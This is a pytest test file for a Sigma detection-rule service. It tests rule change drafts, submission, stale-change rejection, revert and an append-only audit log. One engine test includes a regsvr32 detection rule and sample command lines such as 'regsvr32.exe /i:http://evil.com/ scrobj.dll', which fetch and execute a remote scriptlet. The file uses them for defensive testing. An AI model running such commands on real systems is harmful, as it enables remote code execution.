"""Tests for Rule Changes and JSON Evaluation logic."""
import pytest
from app.models.rule import SigmaRule
from app.models.rule_change import RuleChange
from app.services.detection_runner import _ENGINE

YAML_CONTENT = """
title: Test YAML Rule
name: test_yaml_rule
level: high
logsource:
  category: process_creation
detection:
  selection:
    EventID: 1
  condition: selection
"""

JSON_CONTENT = """{
  "title": "Test JSON Rule",
  "name": "test_json_rule",
  "level": "medium",
  "logsource": {
    "category": "process_creation"
  },
  "detection": {
    "selection": {
      "EventID": 1
    },
    "condition": "selection"
  }
}"""

def test_create_draft_json(client, db):
    # Setup
    rule = SigmaRule(name="test_json_rule", title="T", severity="low", yaml_content="", rule_format="json", json_content=JSON_CONTENT)
    db.add(rule)
    db.commit()

    # Save Draft
    res = client.post(
        f"/api/rules/{rule.id}/changes?change_type=draft",
        json={
            "rule_format": "json",
            "new_content": JSON_CONTENT.replace("medium", "high"),
            "change_reason": "Testing draft"
        }
    )
    assert res.status_code == 201
    assert res.json()["change_type"] == "draft"
    
    # Active rule is unchanged
    db.refresh(rule)
    assert "medium" in rule.json_content


def test_submit_and_apply_stale_detection(client, db):
    rule = SigmaRule(name="test_yaml_rule", title="T", severity="low", yaml_content=YAML_CONTENT, rule_format="yaml")
    db.add(rule)
    db.commit()

    # Submit change
    res = client.post(
        f"/api/rules/{rule.id}/changes?change_type=submitted",
        json={
            "rule_format": "yaml",
            "new_content": YAML_CONTENT.replace("high", "critical"),
            "change_reason": "Submit change"
        }
    )
    change_id = res.json()["id"]

    # Someone edits the active rule under the hood
    rule.yaml_content = YAML_CONTENT.replace("high", "informational")
    db.commit()

    # Try to apply - should fail
    res_apply = client.post(f"/api/rules/{rule.id}/changes/{change_id}/apply", json={})
    assert res_apply.status_code == 409
    assert "Stale change" in res_apply.json()["detail"]


def test_revert_change(client, db):
    rule = SigmaRule(name="test_json_rule_revert", title="T", severity="low", yaml_content="", rule_format="json", json_content=JSON_CONTENT.replace("test_json_rule", "test_json_rule_revert"))
    db.add(rule)
    db.commit()

    # Submit
    res = client.post(
        f"/api/rules/{rule.id}/changes?change_type=submitted",
        json={
            "rule_format": "json",
            "new_content": JSON_CONTENT.replace("test_json_rule", "test_json_rule_revert").replace("medium", "high"),
            "change_reason": "Submit change"
        }
    )
    submitted_id = res.json()["id"]

    # Apply returns new applied record
    res_apply = client.post(f"/api/rules/{rule.id}/changes/{submitted_id}/apply", json={})
    assert res_apply.status_code == 200
    applied_id = res_apply.json()["id"]

    db.refresh(rule)
    assert "high" in rule.json_content

    # Revert applied record
    res_rev = client.post(f"/api/rules/{rule.id}/changes/{applied_id}/revert", json={})
    assert res_rev.status_code == 200
    db.refresh(rule)
    assert "medium" in rule.json_content


def test_append_only_audit_log(client, db):
    yaml_content = YAML_CONTENT.replace("test_yaml_rule", "test_append_only_rule")
    rule = SigmaRule(name="test_append_only_rule", title="T", severity="low", yaml_content=yaml_content, rule_format="yaml")
    db.add(rule)
    db.commit()

    # 1. Submit a change
    res_sub = client.post(
        f"/api/rules/{rule.id}/changes?change_type=submitted",
        json={
            "rule_format": "yaml",
            "new_content": yaml_content.replace("high", "critical"),
            "change_reason": "Testing append-only audit"
        }
    )
    assert res_sub.status_code == 201
    submitted_id = res_sub.json()["id"]
    assert res_sub.json()["change_type"] == "submitted"
    assert "+00:00" in res_sub.json()["changed_at"]

    # 2. Apply the submitted change
    res_app = client.post(f"/api/rules/{rule.id}/changes/{submitted_id}/apply", json={})
    assert res_app.status_code == 200
    applied_data = res_app.json()
    applied_id = applied_data["id"]

    # Applied record is a SEPARATE new record
    assert applied_id != submitted_id
    assert applied_data["change_type"] == "applied"
    assert applied_data["parent_change_id"] == submitted_id
    assert "+00:00" in applied_data["changed_at"]

    # 3. Verify original submitted record remains unchanged in DB and list
    res_list = client.get(f"/api/rules/{rule.id}/changes")
    assert res_list.status_code == 200
    history = res_list.json()

    submitted_record = next(r for r in history if r["id"] == submitted_id)
    assert submitted_record["change_type"] == "submitted"

    applied_record = next(r for r in history if r["id"] == applied_id)
    assert applied_record["change_type"] == "applied"
    assert applied_record["parent_change_id"] == submitted_id


def test_engine_contains_all_logic():
    # Prove that CommandLine|contains|all correctly checks for BOTH indicators
    rule_logic = """
    title: Regsvr32 Test
    name: regsvr32_test
    level: high
    logsource:
      category: process_creation
    detection:
      selection:
        CommandLine|contains|all:
          - '/i:'
          - 'scrobj.dll'
      condition: selection
    """
    
    # 1. Neither
    assert _ENGINE.evaluate(rule_logic, {"CommandLine": "regsvr32.exe /s"}) == False
    
    # 2. Only /i:
    assert _ENGINE.evaluate(rule_logic, {"CommandLine": "regsvr32.exe /i:http://evil.com/ payload.dll"}) == False
    
    # 3. Only scrobj.dll
    assert _ENGINE.evaluate(rule_logic, {"CommandLine": "regsvr32.exe /s scrobj.dll"}) == False
    
    # 4. Both
    assert _ENGINE.evaluate(rule_logic, {"CommandLine": "regsvr32.exe /i:http://evil.com/ scrobj.dll"}) == True

def test_engine_json_logic():
    # Prove engine evaluates JSON formats and uses schema validation
    assert _ENGINE.evaluate(JSON_CONTENT, {"EventID": 1}, rule_format="json") == True
    assert _ENGINE.evaluate(JSON_CONTENT, {"EventID": 2}, rule_format="json") == False
